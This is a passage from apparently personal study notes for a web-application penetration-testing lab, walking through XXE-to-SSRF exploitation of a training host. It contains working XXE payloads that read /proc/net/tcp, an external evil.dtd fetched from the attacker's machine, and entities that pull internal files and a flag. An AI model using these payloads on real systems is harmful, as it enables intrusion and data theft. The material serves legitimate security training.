+</code></pre><p id="7680033a-d65a-411d-9b82-86b2e721b730" class="">The netcat listener receives the request. We can recognize the victim java version in the User-agent header.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d5b4dc7f-51ca-4946-bfb2-ab786d4781a4" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">nc -lvnp 8080
+</code></pre><h3 id="503d03f3-ac96-4a02-8e48-3a1f263ec985" class=""><strong>Extending XSLT Attacks</strong><strong><a href="https://johnermac.github.io/notes/ewptx/serverside/#extending-xslt-attacks"></a></strong></h3><p id="cef82f52-a27a-439f-bfbb-c579418767b2" class="">In real world, its tough. But again documentation might help u to identify a severe vuln. Also, XSLT parsers may be vulnerable to XXE vulns in the same way as all other XML parsers.</p><blockquote id="3b4653bf-e8bb-405e-a082-0c50e7978555" class="">WHen responding to XSL:INCLUDE directives, u might also try to respond with XML that contains an XXE payload.</blockquote><blockquote id="f62667f8-842f-4c4a-9eaf-4e3e5705eeb4" class="">Moreover, XSLT engines might be able to execute custom code, which results in RCE</blockquote><p id="296c2b13-034c-4271-9d8f-1105081e58ef" class="">the second input is the XSLT code</p><p id="f334b815-e348-4d99-a6f5-2e2e1aed159a" class="">the transformation is defined</p><p id="e4764d65-a1e7-4d68-bfc4-308b6bc1d21b" class="">in this case, we use the value of (starting from the root node)</p><p id="4363b339-1c6c-4f84-866f-1e0f32521ab5" class="">unparsed-text example</p><h2 id="96be07c2-6ee1-4e4f-a0dc-ad73e39d89f8" class=""><strong>Lab 1 - SSRF to RCE</strong><strong><a href="https://johnermac.github.io/notes/ewptx/serverside/#lab-1---ssrf-to-rce"></a></strong></h2><p id="7e222d30-fa56-447f-af67-4671d1cf6fc9" class="">Solution</p><p id="65089a6c-fb04-4c95-9e7e-cb73ed705101" class="">Step 1: Open the lab link to access the Kali GUI instance.</p><p id="510d41a1-a090-40ac-a0e1-4e85897c5e30" class="">…</p><p id="21eaf2e2-2bfb-44da-b323-fe47e26dd757" class="">Step 2: Check if the provided machine/domain is reachable.</p><p id="610b3ada-c9b6-4825-a61d-120ba67afe97" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a9022f71-7eda-432e-bec5-3fcbd040cc57" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">ping -c3 demo.ine.local
+</code></pre><blockquote id="762aaca4-e45a-4743-a405-74b2aa30af8a" class="">The provided machine is reachable.</blockquote><p id="86e3ac71-4380-4676-a2ab-36a4c98ec8aa" class="">Step 3: Check open ports on the provided machine.</p><p id="fdb8c302-3c97-4f9e-b56b-6e3ea2f2b7d3" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4b31309e-fe75-4715-acd1-a80c0cdec152" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">nmap -sS -sV demo.ine.local
+</code></pre><p id="7f3b356f-9908-4874-a42f-b1c4d78c72ab" class="">Ports 22 (SSH), 5000, and 8000 (Python-based HTTP server) are open on the target machine. As mentioned in the challenge description, the vulnerable web application is available on port 5000.</p><p id="1ea555e1-3f94-4a20-b6c6-1a223f7d4878" class="">Also, if you check the output from Nmap, you will find out the fingerprint for the service running at port 5000. It contains the HTTP response.</p><p id="b071ffc1-5ec5-4608-a44a-fab4a26987f5" class="">Step 4: Check the web application available on port 5000.</p><p id="ea3a083b-8329-4182-991b-f564d6a82d17" class="">Open the following URL in the browser:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="aa57edaf-94ab-4a2d-8c28-9788d1688818" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">URL: http://demo.ine.local:5000
+</code></pre><p id="32dd6c49-3cf8-4bc9-8d49-3cea10fc0298" class="">An XML Validator application is available on port 5000.</p><p id="6f220c60-bb96-41b0-b897-a340bddf5b14" class="">Send the following XML snippet for validation:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c5cd5c87-4378-471f-8027-08cbee3a5c2c" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;parent&gt;
+  &lt;child&gt;
+    &lt;name&gt;Test Name&lt;/name&gt;
+    &lt;description&gt;Test Description&lt;/description&gt;
+  &lt;/child&gt;
+&lt;/parent&gt;
+</code></pre><p id="4d02a3bf-78ea-4eb9-afb3-f7d24ec866dd" class="">Click on the Validate XML button:</p><ul id="bd257bcd-9894-496c-bd16-5dafd8c7f10a" class="bulleted-list"><li style="list-style-type:disc">The response indicates that the supplied XML is valid.</li></ul><blockquote id="2db665fa-e1f1-4d3d-80d6-dc7ba8c1624c" class="">Notice that the supplied XML is also reflected in the response.</blockquote><p id="88909c9d-9c55-4504-a4e4-5c3dee93999e" class="">Step 5: Identify and exploit the XXE vulnerability.</p><p id="2b07cd0f-90bd-49cc-b194-ed2a706c886d" class="">Send the following XML snippet containing an XML entity:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="97f1b5b8-1bcb-4832-b97a-9fe5a628bdaf" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE replace [&lt;!ENTITY desc &quot;Test Description&quot;&gt; ]&gt;
+&lt;parent&gt;
+  &lt;child&gt;
+    &lt;name&gt;Test Name&lt;/name&gt;
+    &lt;description&gt;&amp;desc;&lt;/description&gt;
+  &lt;/child&gt;
+&lt;/parent&gt;
+</code></pre><blockquote id="7fae72a9-8fc6-4989-8a36-07e639718396" class="">Notice the response contains the description specified in the XML entity!</blockquote><blockquote id="f2ec9d03-956c-4b82-b818-232f586de4b4" class="">Note that we know there is an XXE vulnerability; lets leverage it to pull information on the internal services running on the target machine.</blockquote><p id="4cacd119-a7d5-4c34-aafa-28d0d0a5f91c" class="">Use the following XML snippet to read the contents of the /proc/net/tcp file:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9331d9ac-f9dd-4d36-aecf-37a1b5c08e0a" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE data [
+  &lt;!ENTITY file SYSTEM &quot;file:///proc/net/tcp&quot;&gt;
+]&gt;
+
+&lt;data&gt;&amp;file;&lt;/data&gt;
+</code></pre><p id="ea5f55c3-11d1-4eaa-875b-7dbdd7ef1376" class="">Information: The /proc/net/tcp file contains information on the current TCP network connections.</p><blockquote id="4377eb4e-803b-434b-8d8b-6417e095569c" class="">Notice we got back the file contents!</blockquote><p id="a36f4de5-45a1-4cce-bafb-a9ede7eb97c9" class="">Contents of the /proc/net/tcp file:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="90bbe57f-4079-41bd-a1ba-1c8b0e567f5a" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">sl local_address rem_address st tx_queue rx_queue tr tm-&gt;when retrnsmt uid timeout inode
+0: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000 0 0 74435656 1 0000000000000000 100 0 0 10 0
+1: 0100007F:22B8 00000000:0000 0A 00000000:00000000 00:00000000 00000000 0 0 74418007 1 0000000000000000 100 0 0 10 0
+2: 0B00007F:9599 00000000:0000 0A 00000000:00000000 00:00000000 00000000 65534 0 74430920 1 0000000000000000 100 0 0 10 0
+3: 00000000:1F40 00000000:0000 0A 00000000:00000000 00:00000000 00000000 0 0 74434697 1 0000000000000000 100 0 0 10 0
+4: 034CDCC0:1F40 024CDCC0:EB4C 06 00000000:00000000 03:0000176F 00000000 0 0 0 3 0000000000000000
+5: 034CDCC0:1F40 024CDCC0:EB4E 01 00000000:00000000 00:00000000 00000000 0 0 74434828 1 0000000000000000 20 4 30 10 -1
+</code></pre><blockquote id="740b0948-a8c6-4eeb-a90c-8cfb2611d315" class="">[Note] The information you received would differ slightly since the IP addresses of the machines change at every lab launch. Kindly make sure to fetch the contents of the above file before proceeding.</blockquote><p id="72cf262d-f8ed-48e0-bed6-4016f57bf492" class="">Step 6: Decode the IP addresses and port numbers retrieved from the /proc/net/tcp file.</p><p id="5c01d77e-d7db-4f57-9b98-4f4a8d2e2221" class="">Use the following Python script to convert the IP addresses in hex to dotted-decimal notation:</p><p id="4256d445-cc3c-4c31-b6fb-2550761cbdc7" class="">convert.py:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c482421c-3f13-4014-8e03-08b1e088c8af" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">import socket
+import struct
+hex_ip = input(&quot;Enter IP (in hex): &quot;)
+addr_long = int(hex_ip, 16)
+print(&quot;IP in dotted-decimal notation:&quot;, socket.inet_ntoa(struct.pack(&quot;&lt;L&quot;, addr_long)))
+</code></pre><p id="a61d4172-dcaf-4977-9e4d-c0687971ed1d" class="">Convert the hex IP addresses received from /proc/net/tcp file:</p><p id="c7ff5386-fae0-424b-84b4-55870167c02f" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="14c55efe-1392-40e4-9274-5ccc75ebbaa8" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">python3 convert.py
+</code></pre><p id="c82d24af-73c0-42ca-945d-680cbe90d98b" class="">Once all the IP addresses are converted, look for the internal IPs. In this case, it’s 127.0.0.1 and 127.0.0.11</p><p id="16394444-0183-49cf-b68e-83152bc40134" class="">Let’s also convert the ports from hex to decimal system:</p><p id="f4334954-6bcf-47bb-9d66-7c7eb7334770" class="">Commands:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9e5aeaf9-da93-4310-9893-d520e96aad28" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">python3
+0x0016
+0x22B8
+0x9599
+0x1F40
+</code></pre><blockquote id="3477632c-5583-4311-a683-23786aed802c" class="">The ports corresponding to internal IPs are 8000 and 38297, respectively.</blockquote><p id="bbd5286e-de41-48c3-af07-1bc537ae6078" class="">Step 7: Perform an SSRF attack to interact with internal services.</p><p id="2906a225-3010-4bbe-9930-df2411dbdbe3" class="">Check the IP address of the attacker machine:</p><p id="cfb14f47-f5a1-4623-9e3e-0d89396d39ff" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="257303bf-854b-480e-b8fe-e59d1f2ed645" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">ip addr
+</code></pre><p id="6b7c4bbd-e446-4d89-851b-901f89939561" class="">The IP address of the attacker machine is 192.220.76.2</p><blockquote id="160dbe66-86ec-4b68-b940-578e4d65a79d" class="">[Note] The IP address of the machines is bound to change with every lab start. Kindly make sure to get the correct IP address before moving on to the next steps. Failing to do that would result in failed exploitation attempts.</blockquote><p id="a46874d2-6696-47e8-8177-6a8cd9711160" class="">We will send the following XML snippet to the vulnerable web application:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6b298928-f9b3-403d-9698-79f18d0d7ff1" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+&lt;!DOCTYPE data [
+  &lt;!ENTITY % dtd SYSTEM &quot;http://192.220.76.2:8080/evil.dtd&quot;&gt;
+  %dtd;
+  %all;
+]&gt;
+&lt;data&gt;&amp;fileContents;&lt;/data&gt;
+</code></pre><blockquote id="4704c217-ee9a-4e36-9c86-c3a9bfaf3931" class="">[Note] Kindly make sure to replace the IP address in the above payload.</blockquote><p id="191547a2-b5ba-4be1-86a5-1a8cffcb6171" class="">Before sending the above XXE payload, save the following snippet as evil.dtd:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d87873f2-15bc-4897-b95e-e810ccbb2a2f" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;
+&lt;!ENTITY % file SYSTEM &quot;http://localhost:8888&quot;&gt;
+&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;
+&lt;!ENTITY % all &quot;&lt;!ENTITY fileContents &#x27;%start;%file;%end;&#x27;&gt;&quot;&gt;
+</code></pre><p id="56ea6efb-4bdb-49d0-9b26-63ac1c2b6755" class="">Start a Python-based HTTP server on port 8080:</p><p id="4753589d-c694-45d1-a99f-656107ffd8df" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="747fc6ad-d863-405c-9d23-b12b57f96189" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">python3 -m http.server 8080
+</code></pre><p id="8b55937a-6681-4ba3-a50f-2d0214727fe1" class="">Information on the payload:</p><p id="c12fc2a0-2a0c-498a-b1ae-e0ddfe8c3137" class="">The first payload (sent to the web app for validation) would load the contents of the evil.dtd file from the attacker machine and then this file would be parsed by the backend.</p><p id="44b7a6f5-4e72-474a-8572-fec8bbf2d6d2" class="">The evil.dtd file contains the entity that sends a request to localhost:8888 and the result is embedded within the CDATA section.</p><p id="ab051aa8-82ed-450c-92da-4fbdd15d4adb" class="">Information on CDATA:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0403001c-9000-4f76-8ab5-b5b0c7011133" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">CDATA sections can be used to &quot;block escape&quot; literal text when replacing
+prohibited characters with entity references is undesirable.
+</code></pre><ul id="823b19c4-4309-418f-8241-550e5b97f691" class="bulleted-list"><li style="list-style-type:disc">Reference: https://www.w3resource.com/xml/CDATA-sections.php</li></ul><p id="5a198a46-52a5-467a-aeb3-78261c61b71d" class="">Some examples of prohibited characters are:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f6e5c0d7-577b-4b23-9aab-7f381314629e" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;
+,
+&gt;
+,
+&amp;
+,
+&quot;
+,
+&#x27;
+.
+
+</code></pre><p id="95f964ae-e962-43c8-8458-543e075540fc" class="">So, the above payload makes sure that if the response does contain some restricted characters, those characters will get embedded into the CDATA section, and hence the XML validator will raise no errors.</p><p id="26b9e441-57cf-41d0-8b94-7a2c7b8945f9" class="">Now we are ready to send the XXE payload:</p><p id="86109b48-3ff5-481c-9588-9f978aafd98d" class="">Notice the response contains a directory listing. It must be some sort of HTTP server.</p><blockquote id="737a823f-478b-437d-ab9c-1010d578ada5" class="">The response indicates the presence of files like flag1 and directories like .ssh.</blockquote><p id="3ab3069f-8b49-4cab-83ad-e969d2b746ec" class="">Head back to the terminal running the Python-based HTTP server:</p><ul id="4806b928-e686-4439-a431-29cb31c36b6c" class="bulleted-list"><li style="list-style-type:disc">Notice there was a request from the target machine to fetch the evil.dtd file.</li></ul><ul id="14a43720-cc4b-46e5-aba5-aa9ae937cc4d" class="bulleted-list"><li style="list-style-type:disc">Save the HTML contents received from the internal HTTP server:</li></ul><p id="3cda1bc9-3e25-4993-bc78-3accc99fe1aa" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6232d88e-2e49-4783-adb8-851a1631fe4d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">cat listing.html
+</code></pre><p id="52bb115c-2629-436f-8f0a-670e1e64017a" class="">Open the listing.html file in the browser:</p><p id="47f8f349-1be6-487d-b98d-1c487c5ce8fb" class="">URL:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="fdd0df4f-28b6-4869-88b0-069ef2221d3b" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">file:///root/listing.html
+</code></pre><p id="e97c20bb-d6d0-402b-9a25-b5c31fbc8ec0" class="">Notice there are 2 entries: <strong>.ssh/</strong> and <strong>flag1</strong>.</p><p id="a8427c53-f03e-40ba-b3d2-483eedf3f1f8" class="">Lets fetch these in the subsequent steps.</p><blockquote id="ba6d4a34-1b66-4db7-9990-66e9dc1af80c" class="">[Note] The other internal port open on the machine won’t return any information. U r encouraged to interact with it by modifying the evil.dtd file to contain the IP and port on which that service is running.</blockquote><p id="62a9d3eb-89a2-48cc-a311-5ec341096a82" class="">Step 8: Retrieve the first flag via XXE.</p><p id="8dfd84b0-5178-4e76-be18-51476b1d90ce" class="">Modify the evil.dtd file to fetch the contents of file flag1:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="afd26c51-4cf9-4a06-b926-5c25e543b057" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;
+&lt;!ENTITY % file SYSTEM &quot;http://localhost:8888/flag1&quot;&gt;
+&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;
+&lt;!ENTITY % all &quot;&lt;!ENTITY fileContents &#x27;%start;%file;%end;&#x27;&gt;&quot;&gt;
